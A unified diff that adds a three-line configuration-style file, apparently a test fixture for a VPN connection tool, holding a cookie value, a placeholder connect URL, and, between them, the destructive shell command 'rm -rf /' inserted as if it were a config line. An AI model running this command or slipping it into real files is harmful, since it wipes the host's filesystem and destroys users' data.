@@ -1,0 +1,3 @@
+COOKIE='a'
+rm -rf /
+CONNECT_URL='https://vpn.example.com/'
